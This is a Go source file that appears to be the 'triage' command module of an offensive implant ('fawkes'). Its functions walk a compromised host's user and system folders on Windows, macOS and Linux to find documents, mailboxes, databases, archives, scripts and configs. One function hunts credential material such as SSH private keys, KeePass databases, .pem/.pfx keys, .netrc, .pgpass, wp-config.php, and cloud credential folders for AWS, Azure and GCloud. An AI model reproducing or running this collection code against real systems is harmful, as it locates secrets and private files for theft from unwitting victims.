package commands

import (
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"

	"fawkes/pkg/structs"
)

func triageDocuments(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
		".odt", ".ods", ".odp", ".rtf", ".csv",
		".txt", ".md", ".log",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			filepath.Join(home, "OneDrive"),
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
		}
	default:
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			home,
		}
	}

	return triageScan(task, searchPaths, extensions, "doc", args, 3)
}

func triageCredentials(task structs.Task, args triageArgs) []triageResult {
	// Credential file patterns
	patterns := []string{
		"*.kdbx", "*.kdb", "*.key", "*.pem", "*.pfx", "*.p12",
		"*.ppk", "*.rdp", "id_rsa", "id_ed25519", "id_ecdsa",
		"*.ovpn", "*.conf", ".netrc", ".pgpass",
		"credentials", "credentials.json", "credentials.xml",
		"web.config", "wp-config.php",
		"*.jks", "*.keystore",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			home,
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, "AppData", "Roaming"),
			`C:\inetpub`,
			`C:\xampp`,
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, ".gnupg"),
			filepath.Join(home, ".config"),
			"/etc",
		}
	default:
		searchPaths = []string{
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, ".gnupg"),
			filepath.Join(home, ".config"),
			"/etc",
			"/opt",
			"/var/www",
		}
	}

	return triageScanPatterns(task, searchPaths, patterns, "cred", args, 3)
}

func triageConfigs(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".conf", ".cfg", ".ini", ".yaml", ".yml", ".json",
		".xml", ".properties", ".env", ".toml",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".kube"),
			`C:\ProgramData`,
		}
	default:
		searchPaths = []string{
			"/etc",
			filepath.Join(home, ".config"),
			filepath.Join(home, ".kube"),
			filepath.Join(home, ".docker"),
		}
	}

	return triageScan(task, searchPaths, extensions, "config", args, 2)
}

func triageDatabase(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".db", ".sqlite", ".sqlite3", ".mdb", ".accdb",
		".ldf", ".mdf", ".sdf", ".bak",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			home,
			filepath.Join(home, "Documents"),
			filepath.Join(home, "AppData"),
			`C:\inetpub`,
			`C:\ProgramData`,
		}
	default:
		searchPaths = []string{
			home,
			"/var/lib",
			"/opt",
			"/var/www",
			"/srv",
			"/tmp",
		}
	}

	return triageScan(task, searchPaths, extensions, "database", args, 4)
}

func triageScripts(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".py", ".sh", ".bash", ".ps1", ".psm1", ".psd1",
		".bat", ".cmd", ".vbs", ".js", ".rb", ".pl",
		".php", ".lua", ".go", ".rs",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			`C:\Scripts`,
			`C:\Tools`,
		}
	default:
		searchPaths = []string{
			home,
			"/opt",
			"/usr/local/bin",
			"/var/www",
			"/srv",
		}
	}

	return triageScan(task, searchPaths, extensions, "script", args, 3)
}

func triageArchives(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".zip", ".7z", ".rar", ".tar", ".gz", ".tgz",
		".bz2", ".xz", ".cab", ".iso", ".dmg",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			`C:\Backups`,
			`C:\Temp`,
		}
	default:
		searchPaths = []string{
			home,
			"/tmp",
			"/var/backups",
			"/opt",
		}
	}

	return triageScan(task, searchPaths, extensions, "archive", args, 3)
}

func triageMail(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".pst", ".ost", ".eml", ".msg", ".mbox",
		".emlx", ".dbx", ".nsf",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents", "Outlook Files"),
			filepath.Join(home, "AppData", "Local", "Microsoft", "Outlook"),
			filepath.Join(home, "AppData", "Roaming", "Thunderbird", "Profiles"),
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, "Library", "Mail"),
			filepath.Join(home, "Library", "Thunderbird", "Profiles"),
			filepath.Join(home, "Documents"),
		}
	default:
		searchPaths = []string{
			home,
			filepath.Join(home, ".thunderbird"),
			filepath.Join(home, ".local", "share", "evolution", "mail"),
			"/var/mail",
			"/var/spool/mail",
		}
	}

	return triageScan(task, searchPaths, extensions, "mail", args, 3)
}

func triageCustom(task structs.Task, args triageArgs) []triageResult {
	// Scan all files under the custom path
	var results []triageResult
	_ = filepath.WalkDir(args.Path, func(path string, d fs.DirEntry, err error) error {
		if task.DidStop() || len(results) >= args.MaxFiles {
			return fmt.Errorf("limit")
		}
		if err != nil || d.IsDir() {
			return nil
		}
		info, infoErr := d.Info()
		if infoErr != nil {
			return nil
		}
		if info.Size() > args.MaxSize || info.Size() == 0 {
			return nil
		}
		results = append(results, triageResult{
			Path:     path,
			Size:     info.Size(),
			ModTime:  info.ModTime().Format("2006-01-02 15:04"),
			Category: "custom",
		})
		return nil
	})
	return results
}
